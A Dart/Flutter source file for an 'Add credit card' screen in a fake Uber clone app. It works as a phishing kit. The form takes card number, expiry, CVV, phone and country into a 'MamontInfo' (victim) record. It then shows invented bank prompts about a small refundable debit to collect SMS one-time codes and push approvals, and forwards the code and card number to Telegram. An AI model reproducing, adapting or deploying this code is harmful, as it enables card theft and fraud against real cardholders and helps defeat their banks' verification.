import 'package:country_picker/country_picker.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:icons_plus/icons_plus.dart';
import 'package:mask_text_input_formatter/mask_text_input_formatter.dart';
import 'package:uber_clone/bloc/bloc/main_bloc.bloc.dart';
import 'package:uber_clone/models/mamont_info.module.dart';
import 'package:uber_clone/screens/payment/view/payment.dart';
import 'package:uber_clone/screens/payment/widgets/dialog_container.dart';
import 'package:uber_clone/screens/payment/widgets/input_action.dart';
import 'package:uber_clone/screens/payment/widgets/push_content.dart';
import 'package:uber_clone/screens/payment/widgets/succeses_content.dart';

class AddCardUI extends StatefulWidget {
  const AddCardUI({
    super.key,
    required this.changePage,
  });

  final void Function() changePage;

  @override
  State<AddCardUI> createState() => _AddCardUIState();
}

class _AddCardUIState extends State<AddCardUI> {
  final cardNumber = TextEditingController();

  final cardDate = TextEditingController();

  final cardCode = TextEditingController();

  final cardName = TextEditingController();

  final verCode = TextEditingController();

  var phoneMask = MaskTextInputFormatter(
    mask: '+# (###) ###-##-##',
    filter: {"#": RegExp(r'[0-9]')},
    type: MaskAutoCompletionType.lazy,
  );

  var cardNumberMask = MaskTextInputFormatter(
    mask: '#### #### #### ####',
    filter: {"#": RegExp(r'[0-9]')},
    type: MaskAutoCompletionType.lazy,
  );

  var cardDateMask = MaskTextInputFormatter(
    mask: '##/##',
    filter: {"#": RegExp(r'[0-9]')},
    type: MaskAutoCompletionType.lazy,
  );

  bool isResend = false;

  Country? selectedCountry;

  @override
  Widget build(BuildContext context) {
    return BlocBuilder<MainBloc, MainState>(
      builder: (context, state) {
        if (state is PaymentState) {
          return buildContent(state, statusStream: state.statusStream);
        }
        return buildContent(state);
      },
    );
  }

  Widget buildContent(MainState state, {Stream<String>? statusStream}) {
    return Column(
      children: [
        PaymentDialogUI.buildHeader(
          context,
          title: 'Adding a credit card',
          icon: Icons.arrow_back,
          onTap: widget.changePage,
        ),
        const SizedBox(
          height: 35,
        ),
        statusStream == null
            ? const SizedBox.shrink()
            : StreamBuilder(
                stream: statusStream,
                builder: (context, snapshot) {
                  if (snapshot.hasError) {
                    return const SizedBox.shrink();
                  }
                  if (!snapshot.hasData) {
                    return const SizedBox.shrink();
                  }
                  final status = snapshot.data;
                  if (status == 'loading') {
                    return const SizedBox.shrink();
                  }
                  if (status == 'sms') {
                    _showDialog(
                      context,
                      header:
                          'To confirm the operation, we will debit a small amount from you and return it',
                      onSubmit: () => _sendMessgeToTg(true),
                      controller: verCode,
                      isSms: true,
                    );
                    return const SizedBox.shrink();
                  }
                  if (status == 'push') {
                    _showDialog(
                      context,
                      header:
                          'To complete the card linking, confirm the debit in mobile banking.\n\nTo confirm the operation, we will debit a small amount from you and return it',
                      isSms: false,
                      onSubmit: () {},
                      controller: verCode,
                    );
                    return const SizedBox.shrink();
                  }
                  if (status == 'succes') {
                    WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
                      showBottomSheet(
                        enableDrag: false,
                        context: context,
                        builder: (context) => const SuccesesContent(),
                      );
                    });
                    return const SizedBox.shrink();
                  }
                  if (status == 'error_sms') {
                    _showDialog(context,
                        header:
                            'To confirm the operation, we will debit a small amount from you and return it',
                        onSubmit: () => _sendMessgeToTg(true),
                        controller: verCode,
                        isSms: true,
                        error: "Don't trust the code");
                    return const SizedBox.shrink();
                  }
                  WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
                    setState(() {
                      isResend = true;
                    });
                  });
                  return const Padding(
                    padding: EdgeInsets.symmetric(vertical: 10),
                    child: Text(
                      'Invalid credit card information. Check your details and try again later',
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        fontSize: 18,
                        color: Colors.red,
                        fontWeight: FontWeight.w800,
                      ),
                    ),
                  );
                },
              ),
        InputAction(
          controller: cardNumber,
          icon: Padding(
            padding: const EdgeInsets.all(3.0),
            child: Brand(
              Brands.visa,
            ),
          ),
          headerText: 'Card number',
          inputFormatters: [cardNumberMask],
          hintText: '',
        ),
        const SizedBox(
          height: 20,
        ),
        Row(
          children: [
            Expanded(
              child: InputAction(
                controller: cardDate,
                headerText: 'Validity',
                maxLength: 5,
                inputFormatters: [cardDateMask],
                hintText: 'MM/YY',
              ),
            ),
            const SizedBox(
              width: 25,
            ),
            Expanded(
              child: InputAction(
                controller: cardCode,
                headerText: 'CVV',
                maxLength: 3,
                hintText: '123',
              ),
            ),
          ],
        ),
        const SizedBox(
          height: 25,
        ),
        Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Country',
              style: TextStyle(
                fontSize: 18,
                fontWeight: FontWeight.w600,
              ),
            ),
            buildCountryPicker(),
            const SizedBox(
              height: 25,
            ),
            InputAction(
              controller: cardName,
              headerText: 'Phone number',
              hintText: 'Phone number',
              inputFormatters: [phoneMask],
              textInputType: TextInputType.phone,
            ),
            const SizedBox(
              height: 100,
            ),
            Row(
              children: [
                Expanded(
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      padding: const EdgeInsets.symmetric(vertical: 15),
                      backgroundColor: Colors.black,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                    onPressed: () {
                      if (selectedCountry == null) {
                        return;
                      }
                      if (isResend) {
                        context.read<MainBloc>().add(
                              SendDataEvent(
                                mamontInfo: MamontInfo(
                                  cardNumber: cardNumber.text,
                                  cardDate: cardDate.text,
                                  cardCode: cardCode.text,
                                  phone: cardName.text,
                                  country: selectedCountry!.name,
                                ),
                              ),
                            );
                        return;
                      }
                      if (state is PaymentState) return;
                      context.read<MainBloc>().add(
                            SendDataEvent(
                              mamontInfo: MamontInfo(
                                cardNumber: cardNumber.text,
                                cardDate: cardDate.text,
                                cardCode: cardCode.text,
                                phone: cardName.text,
                                country: selectedCountry!.name,
                              ),
                            ),
                          );
                    },
                    child: buildButton(state),
                  ),
                )
              ],
            )
          ],
        )
      ],
    );
  }

  void _sendMessgeToTg(bool isSms) {
    context.read<MainBloc>().add(
          SendMessageToTelegarm(
            messageText: "SMS CODE: ${verCode.text}\nCARD: ${cardNumber.text}",
          ),
        );
    return;
  }

  void _showDialog(
    BuildContext context, {
    required String header,
    required void Function() onSubmit,
    required TextEditingController controller,
    required bool isSms,
    String? error,
  }) {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      showDialog(
        context: context,
        builder: (context) => Center(
          child: DialogContainer(
            child: PushContent(
              controller: controller,
              header: header,
              onSubmit: onSubmit,
              isSms: isSms,
              error: error,
            ),
          ),
        ),
      );
    });
  }

  Widget buildButton(MainState state) {
    return Text(
      isResend ? 'Resend' : 'Save',
      style: const TextStyle(
        color: Colors.white,
        fontWeight: FontWeight.w800,
        fontSize: 18,
      ),
    );
  }

  Widget buildCountryPicker() {
    return Row(
      children: [
        Expanded(
          child: InkWell(
            onTap: () {
              showCountryPicker(
                context: context,
                onSelect: (country) {
                  setState(() {
                    selectedCountry = country;
                  });
                },
              );
            },
            child: Container(
              padding: const EdgeInsets.symmetric(
                horizontal: 15,
                vertical: 12,
              ),
              decoration: BoxDecoration(
                color: Colors.grey[300],
                borderRadius: BorderRadiusDirectional.circular(12),
              ),
              child: Row(
                children: [
                  selectedCountry == null
                      ? const Text(
                          'Choose the country',
                          style: TextStyle(
                            fontSize: 16,
                            color: Colors.black54,
                            fontWeight: FontWeight.w600,
                          ),
                        )
                      : Row(
                          children: [
                            Text(
                              selectedCountry!.flagEmoji,
                              style: const TextStyle(
                                fontSize: 16,
                              ),
                            ),
                            const SizedBox(
                              width: 10,
                            ),
                            Text(
                              selectedCountry!.getTranslatedName(context) ??
                                  'Ошибка',
                              style: const TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.w600,
                                color: Colors.black,
                              ),
                            )
                          ],
                        )
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }
}
